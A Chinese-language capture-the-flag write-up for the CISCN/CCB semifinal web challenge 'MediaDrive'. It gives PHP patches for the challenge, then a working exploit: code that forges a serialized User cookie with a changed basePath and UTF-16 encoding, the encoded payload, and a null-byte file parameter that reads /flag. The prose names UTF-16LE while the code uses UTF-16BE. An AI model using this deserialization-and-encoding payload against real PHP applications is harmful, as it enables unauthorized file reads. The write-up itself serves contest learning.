---
title: 第19届CISCN&CCB半决赛
typora-root-url: 19th-ciscn-3rd-ccb-banjuesai
date: 2026-03-22 08:41:00
tags:
 - ciscn
 - web
categories: Writeup
---

# 第19届CISCN&CCB半决赛

## MediaDrive

### 防御

注意到用户信息存储序列化后在cookie中

根据题目信息，设置用户偏好时存在漏洞

注意到用户信息在反序列后不会校验编码的合法性，可能存在意外的编码，做出如下修补：

```php
class User {
    public $name = "guest";
    public $encoding = "UTF-8";
    public $basePath = "D:/uploads/";

    public function __wakeup()
    {
        $allowed = ["UTF-8", "GBK", "BIG5", "ISO-2022-CN-EXT"];
        if (!in_array($this->encoding, $allowed, true)) {
            $this->encoding = "UTF-8";
        }
    }

    public function __construct(string $name = "guest") {
        $this->name = $name;
        $allowed = ["UTF-8", "GBK", "BIG5", "ISO-2022-CN-EXT"];
        if (!in_array($this->encoding, $allowed, true)) {
            $this->encoding = "UTF-8";
        }
    }
}
```

根据题目，处理文件路径时存在漏洞，做出如下修改：

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $f = $_FILES['file'];
    if ($f['error'] === UPLOAD_ERR_OK) {
//        $name = Util::safeUploadName($f['name'] ?? 'upload.bin');
        $name= "file_" . bin2hex(random_bytes(16) . ".txt");
        if (!Util::isAllowedUploadExtension($name)) {
            $msg = "Upload fa2222   iled.";
        } else {
            $dst = $uploadsDir . $name;
            if (move_uploaded_file($f['tmp_name'], $dst)) {
                $msg = "Uploaded: " . $name;
            } else {
                $msg = "Upload failed.";
            }
        }
    } else {
        $msg = "Upload error: " . (string)$f['error'];
    }
}
```

### 攻击

根据队友提示发现了preview.html中的参数f可以读取任意文件，仅对文件做了正则过滤

![image-20260322114749384](image-20260322114749384.png)

正则过滤后，进行转换编码，而没有在转换后再次过滤路径，造成漏洞

![image-20260322114819771](image-20260322114819771.png)

这里读取的路径是user的`basePath`拼接了输入的参数，意味着可以通过反序列化修改读取路径

同时，由于反序列化没有对编码做合法校验，可以使用一个可通过正则检验的编码，转换为`UTF-8`后是`/flag`的

这里使用了`UTF-16LE`，并设置了用户的`basePath`为根目录，

序列化代码如下：

```php
$user = new User();
$user->encoding = "UTF-16BE";
$user->basePath = "\x00/\x00";
echo urlencode(serialize($user));
```

得到`O%3A4%3A%22User%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A5%3A%22guest%22%3Bs%3A8%3A%22encoding%22%3Bs%3A8%3A%22UTF-16BE%22%3Bs%3A8%3A%22basePath%22%3Bs%3A3%3A%22%00%2F%00%22%3B%7D`

同时f参数设为`f%00l%00a%00g`

因此拼接出的路径为`\x00/\x00f\x00l\x00a\x00g`

![image-20260322115306489](image-20260322115306489.png)

得到flag
